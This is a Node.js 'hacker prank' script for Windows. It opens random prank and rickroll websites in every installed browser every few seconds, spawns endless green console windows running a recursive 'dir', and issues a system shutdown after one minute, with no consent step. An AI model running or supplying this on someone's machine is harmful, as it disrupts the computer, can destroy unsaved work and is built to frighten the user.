const { exec } = require("child_process");

const hackweb = [
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "https://www.facebook.com/","https://www.twitter.com/",
    "https://geekprank.com/hacker/",
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "https://youtu.be/y3Jc2kxaqdw?si=OHzHH30Em-6yXWQU",
    "https://youtu.be/ZF6t-XGdkRQ?si=WMZ4ArRcXGscTckn",
    "https://youtu.be/Hl8BePMoF1s?si=91zKvX6m4KlyKBfx",
    "https://youtu.be/Nw6YNKQU_HM?si=rPm4c-MozvPyuk_j",
    "https://www.youtube.com/live/hUcRUM5ZEUU?si=i_tLLbwkgz5VZVJ2",
    "https://youtu.be/t3DuTsx8Rmw?si=wJEyYO_r1HLrHacN",
    "https://geekprank.com/bios/",
    "https://geekprank.com/jurassic-park/",
    "https://you-are-idiot.github.io/",
    "https://www.virustotal.com/gui/",
    "https://vms.drweb.com/online/?lng=en",
    "https://www.malwarebytes.com/",
    "https://hackprank.com/",
    "https://hackedscreen.com/",
    "https://livethreatmap.radware.com/",
    "https://threatmap.checkpoint.com/"
];

function randrange(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function installBrowser(browser = ["chrome", "firefox", "brave", "msedge", "opera", "vivaldi"]) {
    return new Promise((resolve, reject) => {
        exec("winget list", (error, stdout) => {
        if (error) return reject(error);

        const installed = [];
        const output = stdout.toLowerCase();

        browser.forEach(browserName => {
            if (output.includes(browserName.toLowerCase())) {
            installed.push(browserName);
            }
        });

        resolve(installed);
        });
    });
}

function openWebsite(url, browser) {
    const command = `start ${browser} --new-window -private "${url}"`;
    exec(command, (error) => {
        if (error) {
            console.error(`Error opening ${url} in ${browser}:`, error);
        }
    })
}

async function main() {
    try {
        const browsers = await installBrowser();
        if (browsers.length === 0) {
            console.error("No supported browsers found. Please install one of the following: chrome, firefox, brave, edge, opera, vivaldi.");
        } else {

            // opening websites every 5 seconds
            setInterval(() => {
                const url = hackweb[randrange(0, hackweb.length - 1)];
                const browser = browsers[randrange(0, browsers.length - 1)];
                
                // opening websites
                openWebsite(url, browser);
            }, 2500);

            // fake Dir command every 5 seconds
            setInterval(() => {
                exec('start cmd /k "color a & dir /s .."');
            }, 3000);
        }
    } catch (error) {
        console.error("Error checking installed browsers:", error);
    }

    // To shutdown windows
    setTimeout(() => {
        exec("shutdown /s /t 60");
    }, 60000); // Shutdown after 60 seconds
}

main();
